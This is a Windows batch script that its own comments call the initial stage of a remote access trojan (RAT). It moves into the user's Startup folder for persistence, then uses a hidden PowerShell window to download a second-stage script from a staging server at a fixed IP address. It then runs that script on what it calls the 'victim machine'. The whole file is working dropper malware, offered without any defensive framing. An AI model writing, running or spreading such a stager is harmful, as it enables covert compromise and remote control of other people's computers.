@REM intial stage for RAT

@REM variables
set "INITIAL_PATH=%cd%"
set "FILE_NAME=phase1.cmd"
set "STAGING_PATH=http://10.0.0.212:8000/staging"
set "STARTUP_PATH=C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

@REM move into startup directory
cd %STARTUP_PATH%

@REM get phase2 from local web server to victim machine
powershell -WindowStyle Hidden -c "Invoke-WebRequest -Uri %STAGING_PATH%/phase2.cmd -Outfile phase2.cmd"

@REM run phase2
call phase2.cmd %INITIAL_PATH%\%FILE_NAME%"

